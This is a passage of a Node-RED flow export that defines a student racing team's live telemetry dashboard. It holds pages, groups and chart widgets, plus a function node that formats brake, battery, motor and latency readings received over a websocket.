        "name": "Panther Racing",
        "colors": {
            "surface": "#ffb81c",
            "primary": "#ffffff",
            "bgPage": "#003594",
            "groupBg": "#ffffff",
            "groupOutline": "#cccccc"
        },
        "sizes": {
            "density": "default",
            "pagePadding": "12px",
            "groupGap": "12px",
            "groupBorderRadius": "4px",
            "widgetGap": "12px"
        }
    },
    {
        "id": "397c7fd766338998",
        "type": "ui-group",
        "z": "bad166ee0ebb9845",
        "name": "Motor",
        "page": "6bbce1a2ef54167b",
        "width": "18",
        "height": "1",
        "order": 4,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "4725e01b9b15e327",
        "type": "ui-page",
        "z": "bda8997ed28d204b",
        "name": "Motor Controller",
        "ui": "3856d9c7a21f82f5",
        "path": "/MC",
        "icon": "home",
        "layout": "tabs",
        "theme": "352cdd7d7df2f209",
        "breakpoints": [
            {
                "name": "Default",
                "px": "0",
                "cols": "3"
            },
            {
                "name": "Tablet",
                "px": "576",
                "cols": "6"
            },
            {
                "name": "Small Desktop",
                "px": "768",
                "cols": "9"
            },
            {
                "name": "Desktop",
                "px": "1024",
                "cols": "12"
            }
        ],
        "order": 4,
        "className": "",
        "visible": "true",
        "disabled": "false"
    },
    {
        "id": "2073c37afb5d47a4",
        "type": "ui-group",
        "z": "bda8997ed28d204b",
        "name": "Speeds",
        "page": "4725e01b9b15e327",
        "width": "18",
        "height": "1",
        "order": 1,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "c7b7c4786c54ce6f",
        "type": "ui-group",
        "z": "bda8997ed28d204b",
        "name": "Temps",
        "page": "4725e01b9b15e327",
        "width": "18",
        "height": "1",
        "order": 4,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "f0725d664b53058d",
        "type": "ui-group",
        "z": "bda8997ed28d204b",
        "name": "Currents",
        "page": "4725e01b9b15e327",
        "width": "18",
        "height": "1",
        "order": 3,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "a75d90dceee57537",
        "type": "ui-group",
        "z": "bda8997ed28d204b",
        "name": "Voltages",
        "page": "4725e01b9b15e327",
        "width": "18",
        "height": "1",
        "order": 2,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "52ac7a44f1b8043e",
        "type": "ui-group",
        "z": "bda8997ed28d204b",
        "name": "Other",
        "page": "4725e01b9b15e327",
        "width": "18",
        "height": "1",
        "order": 5,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "edce890c9b63e52a",
        "type": "ui-page",
        "z": "243a5262a5129260",
        "name": "Warnings",
        "ui": "3856d9c7a21f82f5",
        "path": "/Warnings",
        "icon": "home",
        "layout": "grid",
        "theme": "352cdd7d7df2f209",
        "breakpoints": [
            {
                "name": "Default",
                "px": "0",
                "cols": "3"
            },
            {
                "name": "Tablet",
                "px": "576",
                "cols": "6"
            },
            {
                "name": "Small Desktop",
                "px": "768",
                "cols": "9"
            },
            {
                "name": "Desktop",
                "px": "1024",
                "cols": "12"
            }
        ],
        "order": 2,
        "className": "",
        "visible": "true",
        "disabled": "false"
    },
    {
        "id": "a29bea42c7399403",
        "type": "ui-group",
        "z": "243a5262a5129260",
        "name": "General",
        "page": "edce890c9b63e52a",
        "width": "6",
        "height": "1",
        "order": 1,
        "showTitle": false,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "e028eb77398bfe6f",
        "type": "ui-page",
        "z": "5be5a18d72229f60",
        "name": "Suspension",
        "ui": "3856d9c7a21f82f5",
        "path": "/suspension",
        "icon": "home",
        "layout": "tabs",
        "theme": "352cdd7d7df2f209",
        "breakpoints": [
            {
                "name": "Default",
                "px": "0",
                "cols": "3"
            },
            {
                "name": "Tablet",
                "px": "576",
                "cols": "6"
            },
            {
                "name": "Small Desktop",
                "px": "768",
                "cols": "9"
            },
            {
                "name": "Desktop",
                "px": "1024",
                "cols": "12"
            }
        ],
        "order": 5,
        "className": "",
        "visible": "true",
        "disabled": "false"
    },
    {
        "id": "9fb7817fd1a9e748",
        "type": "ui-group",
        "z": "5be5a18d72229f60",
        "name": "Tires",
        "page": "e028eb77398bfe6f",
        "width": "18",
        "height": "1",
        "order": 1,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "fe27ffd83f1195f7",
        "type": "ui-page",
        "z": "43c8977d5bb940cf",
        "name": "Cooling",
        "ui": "3856d9c7a21f82f5",
        "path": "/cooling",
        "icon": "home",
        "layout": "tabs",
        "theme": "352cdd7d7df2f209",
        "breakpoints": [
            {
                "name": "Default",
                "px": "0",
                "cols": "3"
            },
            {
                "name": "Tablet",
                "px": "576",
                "cols": "6"
            },
            {
                "name": "Small Desktop",
                "px": "768",
                "cols": "9"
            },
            {
                "name": "Desktop",
                "px": "1024",
                "cols": "12"
            }
        ],
        "order": 6,
        "className": "",
        "visible": "true",
        "disabled": "false"
    },
    {
        "id": "cf0ca1fa373904ee",
        "type": "ui-group",
        "z": "43c8977d5bb940cf",
        "name": "Radiator",
        "page": "fe27ffd83f1195f7",
        "width": "18",
        "height": "1",
        "order": 4,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "93582a4ebf51aaca",
        "type": "ui-group",
        "z": "43c8977d5bb940cf",
        "name": "Motor",
        "page": "fe27ffd83f1195f7",
        "width": "18",
        "height": "1",
        "order": 2,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "58798ceaa3de3da9",
        "type": "ui-group",
        "z": "43c8977d5bb940cf",
        "name": "Accumulator",
        "page": "fe27ffd83f1195f7",
        "width": "18",
        "height": "1",
        "order": 1,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "d0ab6aac28ac73fd",
        "type": "ui-group",
        "z": "43c8977d5bb940cf",
        "name": "Motor Controller",
        "page": "fe27ffd83f1195f7",
        "width": "18",
        "height": "1",
        "order": 3,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "1ff8677b76cf84c6",
        "type": "ui-page",
        "z": "f794ff764964069d",
        "name": "Accumulator",
        "ui": "3856d9c7a21f82f5",
        "path": "/accumulator",
        "icon": "home",
        "layout": "tabs",
        "theme": "352cdd7d7df2f209",
        "breakpoints": [
            {
                "name": "Default",
                "px": "0",
                "cols": "3"
            },
            {
                "name": "Tablet",
                "px": "576",
                "cols": "6"
            },
            {
                "name": "Small Desktop",
                "px": "768",
                "cols": "9"
            },
            {
                "name": "Desktop",
                "px": "1024",
                "cols": "12"
            }
        ],
        "order": 3,
        "className": "",
        "visible": "true",
        "disabled": "false"
    },
    {
        "id": "43f27ebf639a5e84",
        "type": "ui-group",
        "z": "f794ff764964069d",
        "name": "Other",
        "page": "1ff8677b76cf84c6",
        "width": "18",
        "height": "1",
        "order": 3,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "fba98ac8b1df5097",
        "type": "ui-group",
        "z": "f794ff764964069d",
        "name": "General",
        "page": "1ff8677b76cf84c6",
        "width": "18",
        "height": "1",
        "order": 2,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "5fb4f6a2ce514f5d",
        "type": "ui-group",
        "z": "f794ff764964069d",
        "name": "Critical",
        "page": "1ff8677b76cf84c6",
        "width": "18",
        "height": "1",
        "order": 1,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "311f1647064b3b0a",
        "type": "websocket in",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "server": "",
        "client": "b3e921438611f1ef",
        "x": 130,
        "y": 160,
        "wires": [
            [
                "ee31c85c807bbdd1"
            ]
        ]
    },
    {
        "id": "ee31c85c807bbdd1",
        "type": "json",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 350,
        "y": 160,
        "wires": [
            [
                "3a10ee4ee9b00a89"
            ]
        ]
    },
    {
        "id": "3a10ee4ee9b00a89",
        "type": "function",
        "z": "8c02145f70bf7c6a",
        "name": "function 4",
        "func": "var sigFigs = 2;\nconst currentDate = new Date();\nvar timestamp = currentDate.getTime();\n\nvar VCU_brakePressureSensorDiag =\n{\n    topic: \"Brake Pressure\",\n    payload: msg.payload.VCU_brakePressureSensorDiag\n}\ntry {\n    VCU_brakePressureSensorDiag.payload = VCU_brakePressureSensorDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_brakeBiasAim =\n{\n    topic: \"Brake Bias Aim (ratio)\",\n    payload: msg.payload.VCU_brakeBiasAim\n}\ntry {\n    VCU_brakeBiasAim.payload = VCU_brakeBiasAim.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_steeringAngle =\n{\n    topic: \"Steering Angle (deg)\",\n    payload: msg.payload.VCU_steeringAngle\n}\ntry {\n    VCU_steeringAngle.payload = VCU_steeringAngle.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_vehicleSpeed =\n{\n    topic: \"Vehicle Speed (km/hr)\",\n    payload: msg.payload.VCU_vehicleSpeed\n}\ntry {\n    VCU_vehicleSpeed.payload = VCU_vehicleSpeed.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Current =\n{\n    topic: \"Pack Current (A)\",\n    payload: msg.payload.Pack_Current\n}\ntry {\n    Pack_Current.payload = Pack_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Temperature =\n{\n    topic: \"High Temperature (ºC)\",\n    payload: msg.payload.High_Temperature\n}\ntry {\n    High_Temperature.payload = High_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload.Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload.Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (aH)\",\n    payload: msg.payload.Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Failsafe_Statuses =\n{\n    topic: \"Failsafe Statuses\",\n    payload: msg.payload.Failsafe_Statuses\n}\ntry {\n    Failsafe_Statuses.payload = Failsafe_Statuses.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Motor_Speed =\n{\n    topic: \"INV Motor Speed (deg/s)\",\n    payload: msg.payload.INV_Motor_Speed\n}\ntry {\n    INV_Motor_Speed.payload = INV_Motor_Speed.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Motor_Temp =\n{\n    topic: \"INV Motor Temperature (ºC)\",\n    payload: msg.payload.INV_Motor_Temp\n}\ntry {\n    INV_Motor_Temp.payload = INV_Motor_Temp.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Torque_Feedback =\n{\n    topic: \"INV Torque Feedback (N*m)\",\n    payload: msg.payload.INV_Torque_Feedback\n}\ntry {\n    INV_Torque_Feedback.payload = INV_Torque_Feedback.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Commanded_Torque =\n{\n    topic: \"INV Command Torque (N*m)\",\n    payload: msg.payload.INV_Commanded_Torque\n}\ntry {\n    INV_Commanded_Torque.payload = INV_Commanded_Torque.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_DC_Bus_Voltage =\n{\n    topic: \"Inverter DC Bus Voltage (V)\",\n    payload: msg.payload.INV_DC_Bus_Voltage\n}\ntry {\n    INV_DC_Bus_Voltage.payload = INV_DC_Bus_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Latency =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Latency\n}\ntry {\n    Latency.payload = Latency.payload.toFixed(sigFigs)\n} catch { }\n\nvar Total_Latency =\n{\n    topic: \"Total Latency (s)\",\n    payload: (timestamp - msg.payload.Arduino_Time)\n}\ntry {\n    Total_Latency.payload = Total_Latency.payload/1000\n    Total_Latency.payload = Total_Latency.payload.toFixed(sigFigs)\n} catch { }\n\nvar Message_num =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Counter\n}\ntry {\n    Message_num.payload = Message_num.payload.toFixed(sigFigs)\n} catch { }\n\nvar Messages_lost =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Lost_packages\n}\ntry {\n    Messages_lost.payload = Messages_lost.payload.toFixed(sigFigs)\n} catch { }\n\nvar Percent_lost =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Percent_lost\n}\ntry {\n    Percent_lost.payload = Percent_lost.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_brakePressureSensorDiag,\n    VCU_brakeBiasAim,\n    VCU_steeringAngle,\n    VCU_vehicleSpeed,\n    Pack_Current,\n    High_Temperature,\n    Low_Temperature,\n    Pack_Open_Voltage,\n    Pack_Amphours,\n    Failsafe_Statuses,\n    INV_Motor_Speed,\n    INV_Motor_Temp,\n    INV_Torque_Feedback,\n    INV_Commanded_Torque,\n    INV_DC_Bus_Voltage,\n    Latency,\n    Total_Latency,\n    Message_num,\n    Messages_lost,\n    Percent_lost\n];",
        "outputs": 20,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 580,
        "y": 220,
        "wires": [
            [
                "2971165bf6f68250"
            ],
            [
                "b8518d9a40cd9a6b"
            ],
            [
                "221d957c0a151f05"
            ],
            [
                "d3b8f713442751a5"
            ],
            [
                "eb01f42200945dec"
            ],
            [
                "343e75c353cc746b"
            ],
            [
                "343e75c353cc746b"
            ],
            [
                "fe8b114ea3764372"
            ],
            [
                "51e67d1e7d5835b5"
            ],
            [
                "ee8a762941153191"
            ],
            [
                "c91b218f1a649bcb"
            ],
            [
                "49870665d36fde93"
            ],
            [
                "ddef204483c9e74e"
            ],
            [
                "97d5d2112a6c4ca2"
            ],
            [
                "1f4784635b2d8fcb"
            ],
            [
                "1a40f658e67b5942"
            ],
            [
                "756e566e98656812"
            ],
            [
                "47adaf1c364772c3"
            ],
            [
                "ffe2201d39efadbb"
            ],
            [
                "5202d51c68026e0b"
            ]
        ]
    },
    {
        "id": "2971165bf6f68250",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "d1250303150aa3f0",
        "order": 1,
        "width": 8,
        "height": 5,
        "label": "Brake Pressure",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#dbc8b6",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 800,
        "y": 20,
        "wires": [
            []
        ]
    },
    {
        "id": "221d957c0a151f05",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "d1250303150aa3f0",
        "order": 11,
        "width": 8,
        "height": 5,
        "label": "Steering Angle",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 800,
        "y": 100,
        "wires": [
            []
        ]
    },
    {
        "id": "d3b8f713442751a5",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "15b83a93b8aeb423",
        "order": 1,
        "width": 8,
        "height": 5,
        "label": "Vehicle Speed",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 800,
        "y": 140,
        "wires": [
            []
        ]
    },
    {
        "id": "b2a563336c741ba0",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "d": true,
        "name": "",
        "group": "011feeb1b9590f82",
        "order": 1,
        "width": 8,
        "height": 5,
        "label": "Front Wheel Speed",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1030,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "d5d33a0396d02318",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "d": true,
        "name": "",
        "group": "c9cc447ccf221888",
        "order": 1,
        "width": 8,
        "height": 5,
        "label": "Rear Wheel Speed",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1050,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "eb01f42200945dec",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "245671b56b55a87a",
        "order": 3,
        "width": 8,
        "height": 5,
        "label": "Pack Current",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 790,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "343e75c353cc746b",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "242d0f1a2158f91f",
        "order": 1,
        "width": 8,
        "height": 5,
        "label": "High/Low Battery Temps",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "fe8b114ea3764372",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "41f49638027c9f5c",
        "order": 2,
        "width": 8,
        "height": 5,
        "label": "Pack Open Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "51e67d1e7d5835b5",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "7d94fd89786fa249",
        "order": 9,
        "width": 8,
        "height": 5,
        "label": "Pack Amp Hours",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 810,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "c91b218f1a649bcb",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "cfb5d6237495813d",
        "order": 1,
        "width": 8,
        "height": 5,
        "label": "Motor Speed",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 790,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "49870665d36fde93",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "571e30aa370a5a0d",
        "order": 11,
        "width": 8,
        "height": 5,
        "label": "Motor Temp",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 790,
        "y": 420,
        "wires": [
            []
        ]
    },
    {
        "id": "902247855b997713",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "d": true,
        "name": "",
        "group": "201fee83a6989cfc",
        "order": 2,
        "width": "8",
        "height": "5",
        "label": "Front Brake Temps",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1030,
        "y": 600,
        "wires": [
            []
        ]
    },
    {
        "id": "309cca9f0ab7812d",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "d": true,
        "name": "",
        "group": "e0cd3e0af28cd236",
        "order": 10,
        "width": "8",
        "height": "5",
        "label": "Rear Brake Temps",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1030,
        "y": 640,
        "wires": [
            []
        ]
    },
    {
        "id": "ddef204483c9e74e",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "975d0ecd0d497bdd",
        "order": 3,
        "width": 8,
        "height": 5,
        "label": "Torque Feedback",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 810,
        "y": 460,
        "wires": [
            []
        ]
    },
    {
        "id": "97d5d2112a6c4ca2",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "cd96f2ae31dd827a",
        "order": 1,
        "width": 8,
        "height": 5,
        "label": "Command Torque",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 810,
        "y": 500,
        "wires": [
            []
        ]
    },
    {
        "id": "ee8a762941153191",
        "type": "ui_text",
        "z": "8c02145f70bf7c6a",
        "group": "9fd6ee31836f1727",
        "order": 12,
        "width": 8,
        "height": 5,
        "name": "",
        "label": "Failsafe Statuses",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 810,
        "y": 340,
        "wires": []
    },
    {
        "id": "b8518d9a40cd9a6b",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "9fd6ee31836f1727",
        "order": 2,
        "width": 8,
        "height": 5,
        "label": "Brake Bias Aim",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#dbc8b6",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 800,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "bf713acef4d04c19",
        "type": "ui_text",
        "z": "8c02145f70bf7c6a",
        "d": true,
        "group": "975d0ecd0d497bdd",
        "order": 2,
        "width": "8",
        "height": "5",
        "name": "",
        "label": "BMS Failsafe Statuses",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1100,
        "y": 280,
        "wires": []
    },
    {
        "id": "1f4784635b2d8fcb",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "7165a152081b3c5c",
        "order": 1,
        "width": 8,
        "height": 5,
        "label": "Inverter DC Bus Voltage",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
